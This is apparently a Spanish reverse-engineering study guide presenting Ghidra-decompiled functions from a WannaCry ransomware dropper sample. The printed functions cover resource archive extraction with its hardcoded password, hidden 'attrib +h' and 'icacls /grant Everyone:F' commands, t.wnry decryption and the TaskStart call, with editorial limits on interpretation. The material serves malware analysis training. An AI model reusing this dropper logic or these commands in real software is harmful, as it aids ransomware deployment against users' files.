# P2 — Código seleccionado para lectura

[Guía de esta persona](README.md) · [Índice del equipo](../README.md)

Componente SHA-256: `ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa`. Arquitectura: **x86, PE32**.

Consulta de origen (UTC): `2026-11-15T17:54:00.489884+00:00`. Ghidra **12.2 DEV**.

Cuerpos transcritos del Decompiler, con normalización de espacios; las explicaciones exteriores son editoriales. No es código fuente original ni preparado para compilar. Los comentarios y nombres españoles dentro del código pertenecen al analista.

El JSON original y las muestras se conservan localmente, fuera de Git. La identidad y los hashes de texto están en [indice.json](../indice.json).

## Navegación

- [00401dab — Recurso XIA/2058](#f-00401dab)
- [00401fe7 — Preparación y llamada indirecta](#f-00401fe7)
- [00401064 — Proceso, espera y salida](#f-00401064)
- [004014a6 — Cabecera y procesamiento de t.wnry](#f-004014a6)

<a id="f-00401dab"></a>

## 00401dab — Recurso XIA/2058

Nombre en la exportación: `Extraer_Paquete_XIA_2058-00401dab`.

**Qué mirar:** Sigue recurso → datos → tamaño → rutina auxiliar → bucle de entradas. Se conserva el tratamiento especial de c.wnry.

```c
/* Recurso XIA, ID 0x80a. Extracción estática del ZIP validada por CRC y hashes en manifiesto
   local. */

undefined4 Extraer_Paquete_XIA_2058(HMODULE param_1,undefined4 param_2)

{
  HRSRC hResInfo;
  HGLOBAL hResData;
  LPVOID pvVar1;
  DWORD DVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  char *pcVar6;
  int iVar7;
  int local_130;
  char local_12c [296];

  hResInfo = FindResourceA(param_1,(LPCSTR)0x80a,&DAT_0040f43c);
  if (((hResInfo != (HRSRC)0x0) &&
      (hResData = LoadResource(param_1,hResInfo), hResData != (HGLOBAL)0x0)) &&
     (pvVar1 = LockResource(hResData), pvVar1 != (LPVOID)0x0)) {
    DVar2 = SizeofResource(param_1,hResInfo);
    iVar3 = FUN_004075ad(pvVar1,DVar2,param_2);
    if (iVar3 != 0) {
      local_130 = 0;
      pcVar6 = local_12c;
      for (iVar5 = 0x4a; iVar5 != 0; iVar5 = iVar5 + -1) {
        pcVar6[0] = '\0';
        pcVar6[1] = '\0';
        pcVar6[2] = '\0';
        pcVar6[3] = '\0';
        pcVar6 = pcVar6 + 4;
      }
      FUN_004075c4(iVar3,0xffffffff,&local_130);
      iVar5 = local_130;
      iVar7 = 0;
      if (0 < local_130) {
        do {
          FUN_004075c4(iVar3,iVar7,&local_130);
          iVar4 = strcmp(local_12c,s_c_wnry_0040e010);
          if ((iVar4 != 0) || (DVar2 = GetFileAttributesA(local_12c), DVar2 == 0xffffffff)) {
            FUN_0040763d(iVar3,iVar7,local_12c);
          }
          iVar7 = iVar7 + 1;
        } while (iVar7 < iVar5);
      }
      FUN_00407656(iVar3);
      return 1;
    }
  }
  return 0;
}
```

**Límite de la conclusión:** El nombre del recurso no determina por sí solo su formato: la identificación como ZIP procede del examen estático documentado.

En tu ficha: entradas → condición → llamadas → retorno → evidencia faltante. [Volver a la guía](README.md).


<a id="f-00401fe7"></a>

## 00401fe7 — Preparación y llamada indirecta

Nombre en la exportación: `Preparar_Paquete_Y_Permisos-00401fe7`.

**Qué mirar:** Marca extracción, atributos/permisos, condiciones previas y llamada mediante pcVar3. El prototipo recuperado de la lectura de t.wnry necesita contraste en Listing.

```c
/* Referencias a contraseña interna y comando icacls. No equivale a una captura de ejecución. */

undefined4 Preparar_Paquete_Y_Permisos(void)

{
  int *piVar1;
  DWORD DVar2;
  code *pcVar3;
  int iVar4;
  undefined4 *puVar5;
  char *pcVar6;
  CHAR local_210;
  undefined4 local_20f;
  undefined4 local_8;

  local_210 = DAT_0040f910;
  puVar5 = &local_20f;
  for (iVar4 = 0x81; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  *(undefined1 *)((int)puVar5 + 2) = 0;
  GetModuleFileNameA((HMODULE)0x0,&local_210,0x208);
  FUN_00401225(&DAT_0040f8ac);
  piVar1 = (int *)__p___argc();
  if (*piVar1 == 2) {
    pcVar6 = &DAT_0040f538;
    piVar1 = (int *)__p___argv();
    iVar4 = strcmp(*(char **)(*piVar1 + 4),pcVar6);
    if ((iVar4 == 0) && (iVar4 = FUN_00401b5f(0), iVar4 != 0)) {
      CopyFileA(&local_210,s_tasksche_exe_0040f4d8,0);
      DVar2 = GetFileAttributesA(s_tasksche_exe_0040f4d8);
      if ((DVar2 != 0xffffffff) && (iVar4 = FUN_00401f5d(), iVar4 != 0)) {
        return 0;
      }
    }
  }
  pcVar6 = strrchr(&local_210,0x5c);
  if (pcVar6 != (char *)0x0) {
    pcVar6 = strrchr(&local_210,0x5c);
    *pcVar6 = '\0';
  }
  SetCurrentDirectoryA(&local_210);
  FUN_004010fd(1);
  Extraer_Paquete_XIA_2058(0,s_WNcry_2ol7_0040f52c);
  FUN_00401e9e();
  FUN_00401064(s_attrib__h___0040f520,0,0);
  FUN_00401064(s_icacls____grant_Everyone_F__T__C_0040f4fc,0,0);
  iVar4 = FUN_0040170a();
  if (iVar4 != 0) {
    FUN_004012fd();
    iVar4 = FUN_00401437(0,0,0);
    if (iVar4 != 0) {
      local_8 = 0;
      iVar4 = FUN_004014a6(s_t_wnry_0040f4f4,&local_8);
      if (((iVar4 != 0) && (iVar4 = FUN_004021bd(iVar4,local_8), iVar4 != 0)) &&
         (pcVar3 = (code *)FUN_00402924(iVar4,s_TaskStart_0040f4e8), pcVar3 != (code *)0x0)) {
        (*pcVar3)(0,0);
      }
    }
    FUN_0040137a();
  }
  return 0;
}
```

**Límite de la conclusión:** No presentes TaskStart como una implementación completamente reconstruida ni el orden de llamadas como prueba de finalización de procesos.

En tu ficha: entradas → condición → llamadas → retorno → evidencia faltante. [Volver a la guía](README.md).


<a id="f-00401064"></a>

## 00401064 — Proceso, espera y salida

Nombre en la exportación: `FUN_00401064-00401064`.

**Qué mirar:** Distingue BVar1, param_2, param_3 y uVar3. Si param_2 es cero se omite el bloque de espera.

```c
undefined4 FUN_00401064(LPSTR param_1,DWORD param_2,LPDWORD param_3)

{
  BOOL BVar1;
  DWORD DVar2;
  undefined4 uVar3;
  int iVar4;
  LPSTR *ppCVar5;
  _STARTUPINFOA local_58;
  _PROCESS_INFORMATION local_14;

  local_58.cb = 0x44;
  ppCVar5 = &local_58.lpReserved;
  for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {
    *ppCVar5 = (LPSTR)0x0;
    ppCVar5 = ppCVar5 + 1;
  }
  local_14.hProcess = (HANDLE)0x0;
  local_14.hThread = (HANDLE)0x0;
  local_14.dwProcessId = 0;
  local_14.dwThreadId = 0;
  uVar3 = 1;
  local_58.wShowWindow = 0;
  local_58.dwFlags = 1;
  BVar1 = CreateProcessA((LPCSTR)0x0,param_1,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0
                         ,0x8000000,(LPVOID)0x0,(LPCSTR)0x0,&local_58,&local_14);
  if (BVar1 == 0) {
    uVar3 = 0;
  }
  else {
    if (param_2 != 0) {
      DVar2 = WaitForSingleObject(local_14.hProcess,param_2);
      if (DVar2 != 0) {
        TerminateProcess(local_14.hProcess,0xffffffff);
      }
      if (param_3 != (LPDWORD)0x0) {
        GetExitCodeProcess(local_14.hProcess,param_3);
      }
    }
    CloseHandle(local_14.hProcess);
    CloseHandle(local_14.hThread);
  }
  return uVar3;
}
```

**Límite de la conclusión:** Un retorno positivo aquí no acredita el efecto de la orden externa. Tampoco equivale a su código de salida.

En tu ficha: entradas → condición → llamadas → retorno → evidencia faltante. [Volver a la guía](README.md).


<a id="f-004014a6"></a>

## 004014a6 — Cabecera y procesamiento de t.wnry

Nombre en la exportación: `FUN_004014a6-004014a6`.

**Qué mirar:** Localiza comparación de ocho bytes, campo 0x100, reserva y llamadas auxiliares. Se preservan __thiscall y los tipos automáticos.

```c
HGLOBAL __thiscall FUN_004014a6(int param_1,LPCSTR param_2,uint *param_3)

{
  HGLOBAL pvVar1;
  HANDLE hFile;
  int iVar2;
  HGLOBAL pvVar3;
  int local_248 [2];
  undefined1 local_240;
  undefined4 local_23f;
  undefined2 uStack_23b;
  undefined1 uStack_239;
  uint local_238;
  uint local_234;
  undefined1 local_230 [512];
  undefined4 local_30;
  HGLOBAL local_2c;
  LARGE_INTEGER local_28;
  uint local_20 [3];
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;

  puStack_c = &DAT_004081e0;
  puStack_10 = &DAT_004076f4;
  local_14 = ExceptionList;
  pvVar3 = (HGLOBAL)0x0;
  local_30 = 0;
  local_248[0] = 0;
  local_240 = 0;
  local_23f = 0;
  uStack_23b = 0;
  uStack_239 = 0;
  local_248[1] = 0;
  local_20[0] = 0;
  local_8 = 0;
  ExceptionList = &local_14;
  hFile = CreateFileA(param_2,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    GetFileSizeEx(hFile,&local_28);
    if ((local_28.s.HighPart < 1) && ((local_28.s.HighPart < 0 || (local_28.s.LowPart < 0x6400001)))
       ) {
      iVar2 = (*DAT_0040f880)(hFile,&local_240,8,local_20,0);
      if (iVar2 != 0) {
        iVar2 = memcmp(&local_240,s_WANACRY__0040eb7c,8);
        if (iVar2 == 0) {
          iVar2 = (*DAT_0040f880)(hFile,local_248,4,local_20,0);
          if ((iVar2 != 0) && (local_248[0] == 0x100)) {
            iVar2 = (*DAT_0040f880)(hFile,*(undefined4 *)(param_1 + 0x4c8),0x100,local_20,0);
            if (iVar2 != 0) {
              iVar2 = (*DAT_0040f880)(hFile,local_248 + 1,4,local_20,0);
              if (iVar2 != 0) {
                iVar2 = (*DAT_0040f880)(hFile,&local_238,8,local_20,0);
                if (((iVar2 != 0) && ((int)local_234 < 1)) &&
                   (((int)local_234 < 0 || (local_238 < 0x6400001)))) {
                  iVar2 = FUN_004019e1(*(undefined4 *)(param_1 + 0x4c8),local_248[0],local_230,
                                       &local_30);
                  if (iVar2 != 0) {
                    FUN_00402a76(local_230,PTR_DAT_0040f578,local_30,0x10);
                    local_2c = GlobalAlloc(0,local_238);
                    if (local_2c != (HGLOBAL)0x0) {
                      iVar2 = (*DAT_0040f880)(hFile,*(undefined4 *)(param_1 + 0x4c8),
                                              local_28.s.LowPart,local_20,0);
                      pvVar1 = local_2c;
                      if (((iVar2 != 0) && (local_20[0] != 0)) &&
                         ((0x7fffffff < local_234 ||
                          (((int)local_234 < 1 && (local_238 <= local_20[0])))))) {
                        FUN_00403a77(*(undefined4 *)(param_1 + 0x4c8),local_2c,local_20[0],1);
                        *param_3 = local_238;
                        pvVar3 = pvVar1;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  local_unwind2(&local_14,0xffffffff);
  ExceptionList = local_14;
  return pvVar3;
}
```

**Límite de la conclusión:** El flujo seleccionado no caracteriza completamente las transformaciones criptográficas. No es una DLL descifrada ni una receta de reconstrucción del cifrador.

En tu ficha: entradas → condición → llamadas → retorno → evidencia faltante. [Volver a la guía](README.md).
